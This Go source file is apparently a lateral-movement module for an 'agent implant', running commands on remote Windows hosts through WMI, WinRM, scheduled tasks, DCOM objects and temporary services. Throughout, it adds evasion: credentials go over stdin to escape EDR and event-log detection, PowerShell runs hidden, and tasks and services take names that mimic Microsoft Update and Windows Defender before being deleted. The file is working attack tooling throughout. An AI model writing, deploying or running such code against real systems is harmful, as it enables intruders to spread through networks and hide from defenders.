// Package lateral provides lateral movement techniques for the agent implant.
//
// All techniques use OS-native command-line tools (wmic, powershell, schtasks, sc)
// and are therefore Windows-only at runtime, though the code compiles on all platforms.
package lateral

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// WMIExec runs command on target via PowerShell CIM (Invoke-CimMethod) so that
// credentials are embedded in the script body sent over stdin — never visible as
// process command-line arguments (unlike the legacy wmic.exe /password: flag).
func WMIExec(target, command, user, domain, pass string) (string, error) {
	tgt := escapePS(target)
	cmd := escapePS(command)

	var psScript string
	if user != "" {
		u := user
		if domain != "" {
			u = domain + `\` + user
		}
		psScript = fmt.Sprintf(
			`$p=ConvertTo-SecureString '%s' -AsPlainText -Force;`+
				`$c=New-Object PSCredential('%s',$p);`+
				`$s=New-CimSession -ComputerName '%s' -Credential $c;`+
				`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='%s'};`+
				`Remove-CimSession $s`,
			escapePS(pass), escapePS(u), tgt, cmd,
		)
	} else {
		psScript = fmt.Sprintf(
			`$s=New-CimSession -ComputerName '%s';`+
				`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='%s'};`+
				`Remove-CimSession $s`,
			tgt, cmd,
		)
	}

	out, err := runPSStdin(psScript)
	if err != nil {
		return "", fmt.Errorf("wmi exec failed: %v\n%s", err, out)
	}
	return strings.TrimSpace(out), nil
}

// WinRMExec runs command on target via PowerShell Invoke-Command.
func WinRMExec(target, command, user, domain, pass string) (string, error) {
	var psScript string
	if user != "" {
		u := user
		if domain != "" {
			u = domain + `\` + user
		}
		passEsc := strings.ReplaceAll(pass, `'`, `''`)
		psScript = fmt.Sprintf(
			`$p = ConvertTo-SecureString '%s' -AsPlainText -Force; `+
				`$c = New-Object PSCredential ('%s', $p); `+
				`Invoke-Command -ComputerName '%s' -Credential $c -ScriptBlock { %s }`,
			passEsc, u, target, command,
		)
	} else {
		psScript = fmt.Sprintf(
			`Invoke-Command -ComputerName '%s' -ScriptBlock { %s }`,
			target, command,
		)
	}

	out, err := runPSStdin(psScript)
	if err != nil {
		return "", fmt.Errorf("winrm exec failed: %v\n%s", err, out)
	}
	return strings.TrimSpace(out), nil
}

// SchtaskExec creates a one-shot scheduled task on target via PowerShell CIM so
// credentials are never passed as schtasks.exe /P arguments (which appear in
// process listings and Security event log 4688 / Sysmon event 1).
func SchtaskExec(target, command, user, domain, pass string) (string, error) {
	taskName := "MicrosoftUpdate" + randHex8()
	tgt := escapePS(target)
	tn := escapePS(taskName)

	var sessionSetup string
	if user != "" {
		u := user
		if domain != "" {
			u = domain + `\` + user
		}
		sessionSetup = fmt.Sprintf(
			`$p=ConvertTo-SecureString '%s' -AsPlainText -Force;`+
				`$c=New-Object PSCredential('%s',$p);`+
				`$s=New-CimSession -ComputerName '%s' -Credential $c;`,
			escapePS(pass), escapePS(u), tgt,
		)
	} else {
		sessionSetup = fmt.Sprintf(`$s=New-CimSession -ComputerName '%s';`, tgt)
	}

	// Split command into executable + arguments for ScheduledTaskAction
	exe, arg := splitExeArg(command)
	psScript := sessionSetup + fmt.Sprintf(
		`$a=New-ScheduledTaskAction -Execute '%s' -Argument '%s';`+
			`$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2);`+
			`Register-ScheduledTask -CimSession $s -TaskName '%s' -Action $a -Trigger $t -Force | Out-Null;`+
			`Start-Sleep 5;`+
			`Unregister-ScheduledTask -CimSession $s -TaskName '%s' -Confirm:$false;`+
			`Remove-CimSession $s`,
		escapePS(exe), escapePS(arg), tn, tn,
	)

	out, err := runPSStdin(psScript)
	if err != nil {
		return "", fmt.Errorf("schtask exec failed: %v\n%s", err, out)
	}
	return fmt.Sprintf("Scheduled task %s created and executed on %s", taskName, target), nil
}

// randHex8 returns 8 random lowercase hex characters for use as a unique name suffix.
func randHex8() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		// fallback: mix time nanoseconds
		t := time.Now().UnixNano()
		for i := range b {
			b[i] = byte(t >> (uint(i) * 8))
		}
	}
	return hex.EncodeToString(b)
}

// ── helpers ───────────────────────────────────────────────────────────────────

// escapePS escapes a string for use inside PowerShell single-quoted strings by
// doubling any single-quote characters.
func escapePS(s string) string { return strings.ReplaceAll(s, `'`, `''`) }

// splitExeArg splits a command string into an executable path and argument string.
// e.g. "cmd.exe /c whoami" → ("cmd.exe", "/c whoami")
func splitExeArg(command string) (exe, args string) {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) == 1 {
		return parts[0], ""
	}
	return parts[0], parts[1]
}

// runPSStdin runs a PowerShell script by passing it over stdin so that the
// script body (including any embedded credentials) does not appear in the
// process command-line arguments visible to EDR/process-listing tools.
func runPSStdin(script string) (string, error) {
	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", "-",
	)
	cmd.Stdin = strings.NewReader(script)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// DCOMExec executes command on target via DCOM. method: "mmc20"|"shellwindows"|"shellbrowser".
func DCOMExec(target, command, method string) (string, error) {
	if method == "" {
		method = "mmc20"
	}

	tgt := strings.ReplaceAll(target, `'`, `''`)
	cmdArg := strings.ReplaceAll(command, `'`, `''`)

	var psScript string
	switch method {
	case "mmc20":
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID('MMC20.Application','%s'));`+
				`$o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c %s','7')`,
			tgt, cmdArg,
		)
	case "shellwindows":
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39','%s'));`+
				`$i=$o.Item();$i.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
			tgt, cmdArg,
		)
	case "shellbrowser":
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'C08AFD90-F2A1-11D1-8455-00A0C91F3880','%s'));`+
				`$o.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
			tgt, cmdArg,
		)
	default:
		return "", fmt.Errorf("unknown DCOM method %q — use mmc20|shellwindows|shellbrowser", method)
	}

	out, err := runPSStdin(psScript)
	if err != nil {
		return "", fmt.Errorf("dcom/%s failed on %s: %v\n%s", method, target, err, out)
	}
	return fmt.Sprintf("[+] DCOM %s → %s: command dispatched\n%s",
		method, target, strings.TrimSpace(out)), nil
}

// ServiceExec creates a one-shot service on target, starts it, then deletes it.
func ServiceExec(target, command string) (string, error) {
	svcName := "WinDefSvc" + randHex8()
	unc := `\\` + target

	out, err := exec.Command("sc.exe", unc, "create", svcName,
		"binpath=", "cmd.exe /c "+command,
		"start=", "demand",
	).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sc create failed: %v\n%s", err, out)
	}

	exec.Command("sc.exe", unc, "start", svcName).Run()  //nolint:errcheck
	time.Sleep(2 * time.Second)
	exec.Command("sc.exe", unc, "stop", svcName).Run()   //nolint:errcheck
	exec.Command("sc.exe", unc, "delete", svcName).Run() //nolint:errcheck

	return fmt.Sprintf("Service %s created and started on %s", svcName, target), nil
}
